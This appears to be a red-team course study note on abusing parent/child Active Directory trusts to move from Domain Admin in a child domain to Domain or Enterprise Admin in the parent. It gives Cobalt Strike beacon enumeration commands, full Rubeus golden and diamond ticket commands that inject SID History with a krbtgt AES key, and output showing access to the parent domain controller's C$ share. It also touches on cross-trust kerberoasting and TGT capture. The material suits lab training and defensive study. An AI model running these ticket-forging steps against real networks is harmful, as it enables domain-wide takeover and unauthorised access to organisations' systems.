
When a child domain is added to a forest, it automatically creates a transitive, two-way trust with its parent. 

#### 🖊️ Trust Analysis via Cobalt Strike

1) Check your current domain

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-DomainTrust

SourceName      : dev.cyberbotic.io
TargetName      : cyberbotic.io
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
```

- SourceName: current domain
- TargetName: foreign domain
- TrustDirection: bidirectional is two-way
- TrustAttributes: WITHIN_FOREST lets us know that both of these domains are part of the same forest which implies a parent/child relationship.

2) If we have Domain Admin privileges in the child, we can also gain Domain Admin privileges in the parent using a TGT with a special attribute called SID History.

```
SID History was designed to support migration scenarios, where a user would be moved from one domain to another.  To preserve access to resources in the "old" domain, the user's previous SID would be added to the SID History of their new account.  When creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent.
```

3) This can be achieved using either a [[Golden Tickets]] or [[Diamond Tickets]] 

#### 📔 Golden Ticket for Trust Relationship Exploit

1) The only additional information required is the SID of a target group in the parent domain.

```
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid

objectsid                                   
---------                                   
S-1-5-21-2594061375-675613155-814674916-512

beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name

Name              
----              
dc-1.cyberbotic.io
```

2) Create the golden ticket with Rubeus.

`PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap`

3) Then import it into a logon session and use it to access the domain controller in the parent.

```
beacon> run klist

Current LogonId is 0:0x3a6665

Cached Tickets: (1)

#0>	Client: Administrator @ DEV.CYBERBOTIC.IO
	Server: krbtgt/dev.cyberbotic.io @ DEV.CYBERBOTIC.IO
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96

beacon> ls \\dc-1.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:26:54   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
```


####  📗 Diamond Ticket for Trust Relationship Exploit

1) The Rubeus `diamond` command also has a `/sids` parameter, with which we can supply the extra SIDs we want in our ticket.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap`


If dev.cyberbotic.io also had a child (e.g. test.dev.cyberbotic.io), then a DA in TEST would be able to use their krbtgt to hop to DA/EA in cyberbotic.io instantly because the trusts are transitive.

There are also other means which do not require DA in the child.  For example, you can also kerberoast and ASREProast across domain trusts, which may lead to privileged credential disclosure.  Because principals in CYBER can be granted access to resources in DEV, you may find instances where they are accessing machines we have compromised.  If they interact with a machine with unconstrained delegation, we can capture their TGTs.  If they're on a machine interactively, such as RDP, we can impersonate them just like any other user.

#### ⚠ Opsec




### Properties
---
📆 created   {{27-02-2024}} 11:39
🏷️ tags: #redteam #crto 

---

